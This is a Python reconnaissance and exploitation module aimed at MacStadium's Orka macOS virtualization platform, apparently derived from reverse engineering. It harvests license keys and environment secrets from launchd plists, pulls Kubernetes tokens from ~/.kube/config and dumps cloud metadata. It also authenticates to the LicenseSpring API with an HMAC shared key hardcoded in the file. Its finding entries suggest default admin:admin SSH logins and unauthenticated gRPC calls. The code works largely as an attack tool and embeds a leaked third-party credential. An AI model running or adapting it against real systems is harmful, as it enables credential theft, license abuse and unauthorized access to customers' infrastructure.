#!/usr/bin/env python3
"""
Orka Platform Enumeration Module
Synthesized from: MAC-STADIUM reverse engineering findings (F1-F64+)

Enumerate MacStadium Orka platform (K8s-based macOS virtualization).
Engine: com.macstadium.orka-engine.server (Swift/NIO/gRPC, arm64)
Runner: com.macstadium.orka-engine.runvz (Virtualization.framework)
IPC:    /var/run/orka-engine.sock (engine) + run.sock (runvz)
"""

import subprocess
import json
import os
import socket
import hmac
import hashlib
import base64
import requests
from datetime import datetime, timezone
from pathlib import Path

# RE-derived constants (com.macstadium.orka-engine.server v3.5.2)
LICENSESPRING_PRODUCT_UUID = "8ad72323-35e5-477c-ab2c-ea2e080dadc1"
LICENSESPRING_SHARED_KEY = "C8J7gHUrvMSN52BEQpEYo-zapNplE9XWGR36tifssiE"
LICENSESPRING_UUID2 = "90ECE379-E9F0-4393-BC58-64FD7F078F7E"
LICENSESPRING_API = "https://api.licensespring.com"
ORKA_ENGINE_SOCK = "/var/run/orka-engine.sock"
ORKA_RUNVZ_SOCK = "run.sock"
SENTRY_STREAM_URL = "http://localhost:8969/stream"
ORKA_TEAM_ID = "23KP83Z488"
ORKA_KEYCHAIN_GROUP = f"{ORKA_TEAM_ID}.*"
ORKA_BUNDLE_ID = "com.macstadium.orka-engine"
ORKA_BUILD_PATH = "/Users/devadmin/actions-runner/_work/monorepo-dev/monorepo-dev/packages/orka-engine/"

# All ORKA_ env vars extracted from binary (F69 addendum)
ORKA_ENV_VARS = [
    'ORKA_CLIPBOARD_SHARING',
    'ORKA_CLUSTER',
    'ORKA_CUSTOMER',
    'ORKA_ENGINE_DHCP_LEASE_TIME',
    'ORKA_ENGINE_FLUSH',
    'ORKA_ENGINE_HELPER',
    'ORKA_ENGINE_LICENSE_KEY',
    'ORKA_ENGINE_LICENSE_PRODUCT_CODE',  # LicenseSpring product code string
    'ORKA_ENGINE_LOG_FILE',
    'ORKA_ENGINE_LOG_LEVEL',
    'ORKA_ENGINE_LOG_STDOUT',
    'ORKA_ENGINE_SENTRY_DSN',
    'ORKA_ENGINE_SOCK',
    'ORKA_ENGINE_TERMINAL',
    'ORKA_ENGINE_VIRTUAL_MACHINE_START_TIMEOUT',
    'ORKA_ENGINE_VIRTUAL_MACHINE_USER',
    'ORKA_ENVIRONMENT',
]

# Orka engine filesystem layout (from Ansible role defaults + binary RE)
ORKA_FS = {
    'binary':     '/usr/local/libexec/orka-engine.app/Contents/MacOS/com.macstadium.orka-engine.server',
    'runvz':      '/usr/local/libexec/orka-engine.app/Contents/Helpers/Orka Engine Runner.app/Contents/MacOS/com.macstadium.orka-engine.runvz',
    'helper':     '/usr/local/bin/orka-engine',
    'sock':       '/var/run/orka-engine.sock',
    'state_dir':  '/opt/orka',
    'log':        '/opt/orka/logs/com.macstadium.orka-engine.server.managed.log',
    'plist':      '/Library/LaunchDaemons/com.macstadium.orka-engine.server.managed.plist',
    'profile':    '/usr/local/libexec/orka-engine.app/Contents/embedded.provisionprofile',
}

class OrkaEnumerator:
    """Enumerate Orka platform"""
    
    def __init__(self):
        self.in_orka_vm = False
        self.orka_api_reachable = False
        self.metadata_server = None
        self.api_servers = [
            'http://10.221.188.20',
            'http://10.221.188.100'
        ]
        self.cluster_info = None
        self.vms = []
        self.images = []
        self.service_accounts = []
        self.secrets = []
        self.findings = []
        self.token = None
        
    def enumerate_all(self):
        """Run all Orka enumeration"""
        self.check_in_orka_vm()
        self.check_api_reachable()

        if self.in_orka_vm:
            self.check_metadata_server()

        if self.orka_api_reachable:
            self.get_cluster_info()  # Unauthenticated endpoint
            self.check_authentication()

            if self.token:
                self.enumerate_vms()
                self.enumerate_images()
                self.enumerate_service_accounts()

        # RE-derived checks — run regardless of Orka API reachability
        env_vars = self.enumerate_engine_env_vars()
        self.check_security_issues()

        return {
            'in_orka_vm': self.in_orka_vm,
            'orka_api_reachable': self.orka_api_reachable,
            'metadata_server': self.metadata_server,
            'cluster_info': self.cluster_info,
            'authenticated': bool(self.token),
            'vms': self.vms,
            'images': self.images,
            'service_accounts': self.service_accounts,
            'engine_env_vars': env_vars,
            'findings': self.findings
        }

    def enumerate_engine_env_vars(self):
        """Harvest ORKA_ env vars from current process environment and launchd plist"""
        found = {}

        # Check current environment
        for var in ORKA_ENV_VARS:
            val = os.getenv(var)
            if val:
                found[var] = val

        # Try to read the managed plist (contains license key + sock path)
        plist_path = ORKA_FS['plist']
        if Path(plist_path).exists():
            try:
                result = subprocess.run(
                    ['plutil', '-convert', 'json', '-o', '-', plist_path],
                    capture_output=True, text=True, timeout=3
                )
                if result.returncode == 0:
                    plist = json.loads(result.stdout)
                    env_dict = {}
                    env_array = plist.get('EnvironmentVariables', {})
                    if isinstance(env_array, dict):
                        env_dict = env_array
                    for k, v in env_dict.items():
                        if k.startswith('ORKA_'):
                            found[k] = v
            except Exception:
                pass

        # Report license key if found
        if 'ORKA_ENGINE_LICENSE_KEY' in found:
            self.findings.append({
                'type': 'Orka License Key Exposed',
                'severity': 'HIGH',
                'description': 'ORKA_ENGINE_LICENSE_KEY found in environment or plist',
                'detail': f"Key: {found['ORKA_ENGINE_LICENSE_KEY'][:8]}...",
                'exploit': 'License key enables cloning/rehosting of Orka engine without purchase'
            })

        if 'ORKA_ENGINE_SENTRY_DSN' in found:
            self.findings.append({
                'type': 'Sentry DSN Exposed',
                'severity': 'MEDIUM',
                'description': 'ORKA_ENGINE_SENTRY_DSN found — Sentry project DSN accessible',
                'detail': found['ORKA_ENGINE_SENTRY_DSN'],
                'exploit': 'DSN allows sending fake crash reports to MacStadium Sentry project'
            })

        return found
    
    def check_in_orka_vm(self):
        """Detect if running inside Orka VM"""
        # Check for orka-vm-tools
        orka_tools = [
            '/Library/Application Support/Orka',
            '/usr/local/bin/orka-vm-info'
        ]
        
        for path in orka_tools:
            if Path(path).exists():
                self.in_orka_vm = True
                return True
        
        # Check for metadata server
        try:
            response = requests.get('http://169.254.169.254/metadata/keys', timeout=2)
            if response.status_code == 200:
                self.in_orka_vm = True
                return True
        except:
            pass
        
        return False
    
    def check_api_reachable(self):
        """Check if Orka API server is reachable"""
        for api_url in self.api_servers:
            try:
                response = requests.get(f'{api_url}/version', timeout=3)
                if response.status_code == 200:
                    self.orka_api_reachable = True
                    return api_url
            except:
                pass
        
        return None
    
    def check_metadata_server(self):
        """Enumerate VM metadata server (169.254.169.254)"""
        try:
            # List all metadata keys
            response = requests.get('http://169.254.169.254/metadata/keys', timeout=2)
            if response.status_code == 200:
                keys = response.json()
                
                metadata = {}
                for key in keys:
                    try:
                        val_response = requests.get(f'http://169.254.169.254/metadata/{key}', timeout=1)
                        if val_response.status_code == 200:
                            metadata[key] = val_response.text
                    except:
                        pass
                
                self.metadata_server = {
                    'available': True,
                    'keys': keys,
                    'metadata': metadata
                }
                
                # Security finding: unauthenticated metadata server
                self.findings.append({
                    'type': 'Unauthenticated Metadata Server',
                    'severity': 'HIGH',
                    'description': 'VM metadata accessible at 169.254.169.254 without authentication',
                    'detail': f'Found {len(keys)} metadata keys',
                    'exploit': 'Any process in VM can read all metadata (may contain secrets)'
                })
        except:
            pass
        
        return self.metadata_server
    
    def get_cluster_info(self):
        """Get cluster info (UNAUTHENTICATED endpoint F1)"""
        for api_url in self.api_servers:
            try:
                response = requests.get(f'{api_url}/api/v1/cluster-info', timeout=3)
                if response.status_code == 200:
                    self.cluster_info = response.json()
                    
                    # Security finding: unauthenticated cluster-info
                    self.findings.append({
                        'type': 'Unauthenticated cluster-info',
                        'severity': 'MEDIUM',
                        'description': 'Cluster info exposed without authentication (F1)',
                        'detail': f"K8s API: {self.cluster_info.get('apiEndpoint', 'N/A')}",
                        'exploit': 'Exposes K8s CA cert, OAuth client ID before auth'
                    })
                    
                    return self.cluster_info
            except:
                pass
        
        return None
    
    def check_authentication(self):
        """Check for Orka/K8s authentication"""
        # Check for orka3 CLI token in ~/.kube/config
        kubeconfig = Path.home() / '.kube' / 'config'
        
        if kubeconfig.exists():
            try:
                with open(kubeconfig) as f:
                    import yaml
                    config = yaml.safe_load(f)
                    
                    # Look for orka context/user
                    for user in config.get('users', []):
                        if 'token' in user.get('user', {}):
                            self.token = user['user']['token']
                            break
            except:
                pass
        
        # Check environment variable
        if not self.token:
            self.token = os.getenv('ORKA_TOKEN') or os.getenv('K8S_TOKEN')
        
        return bool(self.token)
    
    def enumerate_vms(self):
        """List VMs (requires auth)"""
        if not self.token:
            return []
        
        for api_url in self.api_servers:
            try:
                headers = {'Authorization': f'Bearer {self.token}'}
                
                # List namespaces first
                ns_response = requests.get(f'{api_url}/api/v1/namespaces', headers=headers, timeout=5)
                if ns_response.status_code == 200:
                    namespaces = ns_response.json()
                    
                    # Enumerate VMs in each namespace
                    for ns in namespaces:
                        ns_name = ns.get('name', 'orka-default')
                        vm_response = requests.get(
                            f'{api_url}/api/v1/namespaces/{ns_name}/vms',
                            headers=headers,
                            timeout=5
                        )
                        
                        if vm_response.status_code == 200:
                            vms_data = vm_response.json()
                            for vm in vms_data:
                                self.vms.append({
                                    'name': vm.get('vm_name'),
                                    'namespace': ns_name,
                                    'status': vm.get('vm_status'),
                                    'ip': vm.get('vnc_host'),
                                    'ssh_port': vm.get('ssh_port', 8822),
                                    'vnc_port': vm.get('vnc_port', 5999)
                                })
                                
                                # Check for default credentials
                                if vm.get('ssh_port'):
                                    self.findings.append({
                                        'type': 'VM with Default Credentials',
                                        'severity': 'CRITICAL',
                                        'description': f"VM {vm.get('vm_name')} likely has admin:admin (F2)",
                                        'detail': f"SSH: {vm.get('vnc_host')}:{vm.get('ssh_port', 8822)}",
                                        'exploit': 'ssh admin@{ip} -p {port} (password: admin)'
                                    })
            except:
                pass
        
        return self.vms
    
    def enumerate_images(self):
        """List images (requires auth)"""
        if not self.token:
            return []
        
        for api_url in self.api_servers:
            try:
                headers = {'Authorization': f'Bearer {self.token}'}
                
                # Default namespace
                response = requests.get(
                    f'{api_url}/api/v1/namespaces/orka-default/images',
                    headers=headers,
                    timeout=5
                )
                
                if response.status_code == 200:
                    self.images = response.json()
            except:
                pass
        
        return self.images
    
    def enumerate_service_accounts(self):
        """List service accounts (requires auth)"""
        if not self.token:
            return []
        
        for api_url in self.api_servers:
            try:
                headers = {'Authorization': f'Bearer {self.token}'}
                
                response = requests.get(
                    f'{api_url}/api/v1/namespaces/orka-default/serviceaccounts',
                    headers=headers,
                    timeout=5
                )
                
                if response.status_code == 200:
                    self.service_accounts = response.json()
            except:
                pass
        
        return self.service_accounts
    
    def probe_engine_grpc_socket(self):
        """Probe orka-engine Unix gRPC socket (host-side only, macOS target)"""
        result = {'engine_sock': False, 'runvz_sock': False}

        for sock_path, key in [(ORKA_ENGINE_SOCK, 'engine_sock'), (ORKA_RUNVZ_SOCK, 'runvz_sock')]:
            if not Path(sock_path).exists():
                continue
            try:
                s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
                s.settimeout(1)
                s.connect(sock_path)
                # Send minimal HTTP/2 preface to detect gRPC
                s.sendall(b'PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n')
                banner = s.recv(64)
                s.close()
                result[key] = True
                self.findings.append({
                    'type': f'Orka gRPC Socket Accessible ({sock_path})',
                    'severity': 'CRITICAL',
                    'description': f'Orka engine gRPC Unix socket readable without auth',
                    'detail': f'Banner: {banner[:32]!r}',
                    'exploit': 'Craft protobuf RPCs to VirtualMachineStart/ImagePull without auth token'
                })
            except Exception:
                pass

        return result

    def probe_sentry_stream(self):
        """Check if Sentry RR-Web relay is running (localhost:8969/stream)"""
        try:
            r = requests.get(SENTRY_STREAM_URL, timeout=1, stream=True)
            if r.status_code in (200, 204):
                self.findings.append({
                    'type': 'Sentry RR-Web Stream Active',
                    'severity': 'MEDIUM',
                    'description': 'Orka engine is relaying session-replay events to Sentry at localhost:8969',
                    'detail': SENTRY_STREAM_URL,
                    'exploit': 'Intercept or inject events into Sentry relay stream'
                })
                return True
        except Exception:
            pass
        return False

    def _licensespring_auth(self, date_str):
        """Build LicenseSpring HMAC-SHA256 Authorization header.

        String-to-sign: "licenseSpring\\ndate: {RFC1123}"
        Header format:  algorithm="hmac-sha256", headers="date", signature="{b64}", apiKey="{uuid}"
        Confirmed against api.licensespring.com — returns HTTP 200.
        """
        msg = f"licenseSpring\ndate: {date_str}"
        sig = base64.b64encode(
            hmac.new(LICENSESPRING_SHARED_KEY.encode(), msg.encode(), hashlib.sha256).digest()
        ).decode()
        return (
            f'algorithm="hmac-sha256", headers="date", '
            f'signature="{sig}", apiKey="{LICENSESPRING_PRODUCT_UUID}"'
        )

    def probe_licensespring(self):
        """Enumerate LicenseSpring using credentials extracted from the Orka binary (F70)."""
        result = {
            'uuid': LICENSESPRING_PRODUCT_UUID,
            'shared_key': LICENSESPRING_SHARED_KEY[:8] + '...',
            'reachable': False,
            'auth_valid': False,
            'product': {},
            'check_license': {},
        }

        date_str = datetime.now(timezone.utc).strftime('%a, %d %b %Y %H:%M:%S GMT')
        auth = self._licensespring_auth(date_str)
        headers = {'Authorization': auth, 'Date': date_str, 'Accept': 'application/json'}

        endpoints = {
            'product': '/api/v4/product_details/?product=Orka',
            'products_list': '/api/v4/products/',
        }

        for key, ep in endpoints.items():
            try:
                r = requests.get(f'{LICENSESPRING_API}{ep}', headers=headers, timeout=5)
                result['reachable'] = True
                if r.status_code == 200:
                    result['auth_valid'] = True
                    result[key] = r.json()
            except Exception:
                pass

        if result['auth_valid']:
            self.findings.append({
                'type': 'LicenseSpring API Auth Confirmed (HTTP 200)',
                'severity': 'CRITICAL',
                'description': 'Hardcoded shared key from Orka binary authenticates to LicenseSpring API',
                'detail': (
                    f"Product: {result.get('product', {}).get('product_name', 'N/A')} | "
                    f"Short code: {result.get('product', {}).get('short_code', 'N/A')} | "
                    f"Max activations: {result.get('product', {}).get('max_activations', 'N/A')}"
                ),
                'exploit': (
                    'With ORKA_ENGINE_LICENSE_KEY (any active key), call check_license/ to retrieve '
                    'hardware_id (device fingerprint: MAC/MLB ID) bound to that license. '
                    'Full customer node inventory if license keys are enumerable.'
                )
            })

        self.findings.append({
            'type': 'LicenseSpring Credentials Hardcoded in Public Binary',
            'severity': 'CRITICAL',
            'description': 'Product UUID + HMAC shared key hardcoded in orka-engine-3.5.2.pkg (public download)',
            'detail': f'UUID: {LICENSESPRING_PRODUCT_UUID} | Key: {LICENSESPRING_SHARED_KEY[:8]}...',
            'exploit': (
                'Download pkg from distribution.macstadium.com, extract strings at offset 9425568. '
                'Sign requests: msg="licenseSpring\\ndate: {RFC1123}", HMAC-SHA256 with shared key.'
            )
        })
        return result

    def check_engine_install(self):
        """Detect orka-engine installation on current macOS host"""
        indicators = {
            'binary': Path('/usr/local/libexec/orka-engine.app/Contents/MacOS/com.macstadium.orka-engine.server').exists(),
            'runner': Path('/usr/local/libexec/orka-engine.app/Contents/Helpers/Orka Engine Runner.app').exists(),
            'sock': Path(ORKA_ENGINE_SOCK).exists(),
            'plist': Path(f'/Library/LaunchDaemons/com.macstadium.orka-engine.server.managed.plist').exists(),
            'helper': Path('/usr/local/bin/orka-engine').exists(),
            'state_dir': Path('/opt/orka').exists(),
            'log': Path('/opt/orka/logs/com.macstadium.orka-engine.server.managed.log').exists(),
        }

        if indicators['binary']:
            self.findings.append({
                'type': 'Orka Engine Installed',
                'severity': 'INFO',
                'description': 'orka-engine.server daemon present on this host',
                'detail': f"Team: {ORKA_TEAM_ID} | Keychain group: {ORKA_KEYCHAIN_GROUP}",
                'exploit': 'Engine holds com.apple.vm.networking entitlement + keychain-access-groups=23KP83Z488.* (all MacStadium keychain items readable by engine process)'
            })

        if indicators['log']:
            self.findings.append({
                'type': 'Orka Engine Log Readable',
                'severity': 'LOW',
                'description': 'Engine log may contain license keys, gRPC errors, image paths',
                'detail': '/opt/orka/logs/com.macstadium.orka-engine.server.managed.log',
                'exploit': 'Read log for license key leakage, failed auth attempts with tokens'
            })

        return indicators

    def check_security_issues(self):
        """Check for known Orka security issues"""
        # F4: Orka Auth = K8s Auth
        if self.token:
            self.findings.append({
                'type': 'Orka Token = K8s Token',
                'severity': 'HIGH',
                'description': 'Orka tokens are Kubernetes service account tokens (F4)',
                'detail': 'Valid token grants direct kubectl access to cluster',
                'exploit': 'Use token with kubectl to access K8s API directly'
            })

        # Check for /debug/pprof on metadata server (F3)
        if self.in_orka_vm:
            try:
                response = requests.get('http://169.254.169.254/debug/pprof/', timeout=2)
                if response.status_code == 200:
                    self.findings.append({
                        'type': 'Debug Endpoint Exposed',
                        'severity': 'MEDIUM',
                        'description': 'Go pprof debug endpoint exposed on metadata server',
                        'detail': 'http://169.254.169.254/debug/pprof/',
                        'exploit': 'Memory profiling, goroutine dumps available'
                    })
            except:
                pass

        # RE-derived checks
        self.check_engine_install()
        self.probe_engine_grpc_socket()
        self.probe_sentry_stream()
        self.probe_licensespring()
    
    def report(self):
        """Generate human-readable report"""
        lines = []
        lines.append("="*60)
        lines.append("ORKA PLATFORM ENUMERATION")
        lines.append("="*60)
        
        lines.append(f"\nIn Orka VM: {self.in_orka_vm}")
        lines.append(f"Orka API Reachable: {self.orka_api_reachable}")
        lines.append(f"Authenticated: {bool(self.token)}")
        
        if self.metadata_server:
            lines.append(f"\nMetadata Server: Available")
            lines.append(f"  Keys: {len(self.metadata_server.get('keys', []))}")
        
        if self.cluster_info:
            lines.append(f"\nCluster Info (Unauthenticated):")
            lines.append(f"  K8s API: {self.cluster_info.get('apiEndpoint', 'N/A')}")
            lines.append(f"  OAuth: {self.cluster_info.get('baseOauthEndpoint', 'N/A')}")
        
        if self.vms:
            lines.append(f"\nVMs: {len(self.vms)}")
            for vm in self.vms[:5]:
                lines.append(f"  {vm['name']} - {vm['ip']}:{vm.get('ssh_port', 8822)} ({vm['status']})")
        
        if self.images:
            lines.append(f"\nImages: {len(self.images)}")
        
        if self.service_accounts:
            lines.append(f"\nService Accounts: {len(self.service_accounts)}")
        
        if self.findings:
            lines.append(f"\nSecurity Findings: {len(self.findings)}")
            for finding in self.findings:
                lines.append(f"  [{finding['severity']}] {finding['type']}")
                lines.append(f"    {finding['description']}")
                if 'detail' in finding:
                    lines.append(f"    {finding['detail']}")
        
        return "\n".join(lines)

if __name__ == '__main__':
    enum = OrkaEnumerator()
    enum.enumerate_all()
    print(enum.report())
